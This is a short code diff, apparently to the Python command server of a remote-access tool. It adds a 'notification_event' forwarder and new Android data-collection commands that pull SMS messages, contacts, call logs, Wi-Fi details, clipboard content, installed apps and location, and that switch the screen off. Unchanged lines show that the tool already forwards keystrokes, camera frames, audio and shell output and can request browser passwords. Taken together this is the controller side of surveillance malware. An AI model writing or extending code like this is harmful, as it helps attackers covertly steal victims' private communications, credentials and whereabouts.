@@ -514,7 +514,7 @@ def _make_fwd(event):
     return _handler
 
 for _ev in ("frame", "key", "camera_frame", "clipboard", "ngrok_url", "audio", "win_frame",
-            "shell_started", "shell_output", "fastcap_info"):
+            "shell_started", "shell_output", "fastcap_info", "notification_event"):
     socketio.on(_ev)(_make_fwd(_ev))
 
 
@@ -789,6 +789,15 @@ for _rr in [
     ("get_dns_cache",          "dns_cache_result"),
     ("get_browser_passwords",  "browser_passwords_result"),
     ("force_update",           "force_update_result"),
+    # Android data collection
+    ("get_sms",                "sms_result"),
+    ("get_contacts",           "contacts_result"),
+    ("get_call_logs",          "call_logs_result"),
+    ("get_wifi_info",          "wifi_info_result"),
+    ("get_clipboard_content",  "clipboard_content_result"),
+    ("get_installed_apps",     "installed_apps_result"),
+    ("get_location",           "location_result"),
+    ("screen_off",             "screen_off_result"),
     # WebRTC signaling: hub requests offer, agent responds with SDP offer
     ("webrtc_request",         "webrtc_offer"),
     # fastcap on-demand streaming
